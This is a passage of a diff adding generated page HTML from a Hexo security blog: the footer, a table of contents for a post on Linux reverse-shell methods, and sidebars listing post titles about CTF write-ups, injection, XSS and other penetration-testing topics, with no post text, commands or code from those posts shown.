+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux下几种反弹shell方法的总结与理解"><span class="toc-number">1.</span> <span class="toc-text">Linux下几种反弹shell方法的总结与理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实验环境"><span class="toc-number">1.0.1.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法1："><span class="toc-number">1.0.2.</span> <span class="toc-text">方法1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法2："><span class="toc-number">1.0.3.</span> <span class="toc-text">方法2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法3："><span class="toc-number">1.0.4.</span> <span class="toc-text">方法3：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法4："><span class="toc-number">1.0.5.</span> <span class="toc-text">方法4：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">1.0.6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#有关反弹shell的一些不错的资料"><span class="toc-number">1.0.7.</span> <span class="toc-text">有关反弹shell的一些不错的资料</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 47
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2019/11/03/ctf记录-记一次有趣的注入/" >ctf记录-记一次有趣的注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2019/10/20/2019极客巅峰ctf记录/" >2019极客巅峰ctf记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2019/05/28/2019强网杯-过滤select的注入/" >2019强网杯-过滤select的注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href= "/2019/04/18/DDCTF2019 write up/" >DDCTF2019 write up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2019/01/11/mssql盲注与dnslog的完美结合(命令执行)/" >渗透技巧-mssql盲注与dnslog的完美结合(命令执行)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/2018/12/21/phpcms2008 type.php代码执行漏洞/" >phpcms2008 type.php代码执行漏洞分析与复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/30</span><a class="archive-post-title" href= "/2018/11/30/Code-Breaking Puzzles挑战/" >Code-Breaking Puzzles挑战</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/2018湖湘杯/" >2018湖湘杯注入题writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2018/10/26/PHP反序列化漏洞学习-绕过_wakeup()函数/" >PHP反序列化漏洞学习-绕过_wakeup()函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2018/10/08/记一次ctf极限利用-不包含数字字母的webshell/" >记一次ctf极限利用-不包含数字字母的webshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2018/09/07/Ecshop2.x & 3.x版本最新漏洞分析与利用/" >Ecshop2.x注入漏洞&代码执行漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href= "/2018/09/02/XSS绕过之中文尖括号/" >XSS绕过之中文尖括号</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/ssrf漏洞学习记录/" >ssrf漏洞学习记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2018/08/19/记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现/" >记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/关于ubuntu和centos cron的一些区别/" >关于ubuntu和centos cron的一些区别</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/解决ubuntu任务计划写shell失败的问题/" >解决ubuntu任务计划写shell失败的问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/2018/08/08/记一次漏洞组合拳-水平越权+Self XSS漏洞/" >记一次漏洞组合拳-水平越权+Self XSS漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2018/07/17/Linux下几种反弹shell方法的总结与理解/" >Linux下几种反弹shell方法的总结与理解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href= "/2018/06/30/渗透技巧使用dnslog加快盲注速度/" >渗透技巧-使用dnslog加快盲注速度</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/07</span><a class="archive-post-title" href= "/2018/06/07/upload-labs记录/" >upload-labs记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2018/06/06/python布尔盲注脚本算法完善/" >python布尔盲注脚本算法完善</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span><a class="archive-post-title" href= "/2018/06/05/python编写布尔盲注脚本/" >python编写布尔盲注脚本</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span><a class="archive-post-title" href= "/2018/06/05/python optparse模块学习/" >python optparse模块学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href= "/2018/06/04/python有序二分查找算法学习/" >python有序二分查找算法学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/burpsuite中配置使用sqlmapapi/" >burpsuite中配置使用sqlmapapi</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href= "/2018/05/25/ISCC2018 write up/" >ISCC2018 write up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2018/05/19/Apache安全加固/" >Apache安全加固</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2018/05/13/php parse_url()函数在解析url引发的绕过思路/" >php parse_url()函数在解析url引发的绕过思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2018/04/19/kali无线网卡wifi破解/" >kali无线网卡wifi破解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2018/03/21/Ettercap实现局域网dns劫持/" >Ettercap实现局域网dns劫持</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2018/03/12/N1CTF2018 77777 writeup/" >N1CTF2018 77777 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span><a class="archive-post-title" href= "/2018/01/12/ARP协议分析以及用python实现一次ARP欺骗/" >ARP协议分析以及用python实现一次ARP欺骗</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span><a class="archive-post-title" href= "/2018/01/12/KPPW25xss/" >KPPW2.5XSS引起的CSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2018/01/11/KPPW25fileupload/" >KPPW2.5文件上传导致远程代码执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2018/01/11/KPPW25sqli/" >KPPW2.5几处sql注入漏洞利用与exp编写</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2017/12/26/DVWA 命令执行/" >dvwa Command Injection</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2017/12/26/DVWA 文件上传/" >dvwa File Inclusion</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/2017/12/24/DVWA SQL注入/" >dvwa sql injection</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/2017/12/21/DVWA DOM XSS/" >dvwa XSS(DOM)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2017/12/01/DVWA 存储型XSS/" >dvwa XSS(Stored)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href= "/2017/11/28/DVWA反射型XSS/" >dvwa XSS(Reflected)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2017/11/26/湖湘杯2017网络安全技能大赛部分题writeup/" >湖湘杯2017网络安全技能大赛部分题writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2017/11/22/DVWA CSRF/" >dvwa CSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2017/11/20/lctf2017注入题学习记录/" >lctf2017注入题学习记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/mysql报错注入总结与原理分析/" >mysql报错注入总结与原理分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/Some Words/" >第三届上海市大学生网络安全大赛注入题writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2017/11/03/github+hexo搭建博客总结/" >我的第一篇博客</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="burpsuite"><span class="iconfont-archer">&#xe606;</span>burpsuite</span>
+    
+        <span class="sidebar-tag-name" data-tags="dvwa学习"><span class="iconfont-archer">&#xe606;</span>dvwa学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
+    
+        <span class="sidebar-tag-name" data-tags="Apache"><span class="iconfont-archer">&#xe606;</span>Apache</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux Shell"><span class="iconfont-archer">&#xe606;</span>Linux Shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="dns劫持"><span class="iconfont-archer">&#xe606;</span>dns劫持</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入"><span class="iconfont-archer">&#xe606;</span>sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="Hexo"><span class="iconfont-archer">&#xe606;</span>Hexo</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqlmap"><span class="iconfont-archer">&#xe606;</span>sqlmap</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞复现"><span class="iconfont-archer">&#xe606;</span>漏洞复现</span>
+    
+        <span class="sidebar-tag-name" data-tags="wifi破解"><span class="iconfont-archer">&#xe606;</span>wifi破解</span>
+    
+        <span class="sidebar-tag-name" data-tags="exp编写"><span class="iconfont-archer">&#xe606;</span>exp编写</span>
+    
+        <span class="sidebar-tag-name" data-tags="反弹shell"><span class="iconfont-archer">&#xe606;</span>反弹shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Linux渗透"><span class="iconfont-archer">&#xe60a;</span>Linux渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞挖掘"><span class="iconfont-archer">&#xe60a;</span>漏洞挖掘</span>
+    
+        <span class="sidebar-category-name" data-categories="其它"><span class="iconfont-archer">&#xe60a;</span>其它</span>
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
+        <span class="sidebar-category-name" data-categories="工具使用"><span class="iconfont-archer">&#xe60a;</span>工具使用</span>
+    
+        <span class="sidebar-category-name" data-categories="web安全"><span class="iconfont-archer">&#xe60a;</span>web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="安全加固"><span class="iconfont-archer">&#xe60a;</span>安全加固</span>
+    
+        <span class="sidebar-category-name" data-categories="Linux-Shell"><span class="iconfont-archer">&#xe60a;</span>Linux-Shell</span>
+    
+        <span class="sidebar-category-name" data-categories="python编程"><span class="iconfont-archer">&#xe60a;</span>python编程</span>
+    
+        <span class="sidebar-category-name" data-categories="其他"><span class="iconfont-archer">&#xe60a;</span>其他</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞复现"><span class="iconfont-archer">&#xe60a;</span>漏洞复现</span>
+    
+        <span class="sidebar-category-name" data-categories="无线安全"><span class="iconfont-archer">&#xe60a;</span>无线安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "c1ay"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
